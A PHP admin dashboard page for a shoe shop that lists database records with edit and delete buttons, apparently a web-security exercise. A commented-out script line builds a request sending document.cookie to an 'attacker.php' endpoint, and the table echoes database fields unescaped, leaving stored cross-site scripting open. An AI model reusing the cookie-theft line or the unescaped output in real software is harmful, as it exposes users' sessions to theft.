<?php
session_start();

if (isset($_SESSION['sesLogin']['btnLogin'])) {
	if (isset($_POST['btnEdit'])) {
		$_SESSION['sesShoeId'] = $_POST['btnEdit'];
		header('location: ./EditShoe.php');
	}
	if (isset($_POST['btnDel'])) {
		require_once '../Database/DBConnection.php';
		$sql = "DELETE FROM Shoe WHERE sId = ?";
		$stmt = $conn->prepare($sql);
		$stmt->bind_param('i', $sId);
		$sId = $_POST['btnDel'];
		$stmt->execute();
		if ($stmt)
			echo "<script>alert('Record Deleted Successfully!');window.location.replace('./Dashboard.php');</script>";
		else
			echo "<script>alert('Record not Deleted!');</script>";
	}
?>

	<!DOCTYPE html>
	<html>

	<head>
		<meta charset="UTF-8">
		<title>OSP</title>
		<!-- <link rel="stylesheet" href="../assets/style.css"> -->
		<link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.css">
		<style>
			h1>a {
				font-size: 25px;
				float: right;
				padding-right: 40px;
				padding-top: 15px;
			}
		</style>
	</head>

	<body>
		<SCRIPT type="text/javascript">
			// var adr = '../attacker.php?victim_cookie=' + escape(document.cookie);
			// alert(adr);
			// alert(document.cookie);
		</SCRIPT>
		<h1>
			&emsp;OSP - Dashboard
			<a href="./AdminLogout.php">Logout</a>
			<a href="./InsertShoe.php">Insert Shoe</a>
		</h1>
		<hr>
		<form method="POST">
			<?php
			require_once '../Database/DBConnection.php';
			$sql = "SELECT * FROM Shoe";
			$result = mysqli_query($conn, $sql);

			if ($result->num_rows < 1)
				echo "<h4 align='center'>Shoes not exist!</h4>";
			else {
				$output = "";
				$output = " <table align='center' cellpadding='20' cellspacing='0'>
						<tr>
							<th>Photo</th>
							<th>Shoe Id</th>
							<th>Brand</th>
							<th>Category</th>
							<th>Price</th>
							<th>Stock</th>
							<th>Action</th>
						</tr>";
				while ($row = mysqli_fetch_array($result)) {
					$output .= "<tr>
									<td><img src='../assets/images/" . $row['photo'] . "' width='150px' height='150px'></td>
									<td>" . $row['sId'] . "</td>
									<td>" . $row['brand'] . "</td>
									<td>" . $row['category'] . "</td>
									<td>" . $row['price'] . "</td>
									<td>" . $row['stock'] . "</td>
									<td>
										<button type='submit' name='btnEdit' value='" . $row['sId'] . "'>Edit</button>&ensp;
										<button type='submit' name='btnDel' value='" . $row['sId'] . "'>Delete</button>
									</td>
								</tr>";
				}
				$output .= "</table>";
				echo $output;
			}
			?>
		</form>
	</body>

	</html>

<?php
} else
	echo "Please <a href='./AdminLogin.php'>Login</a> first!";
?>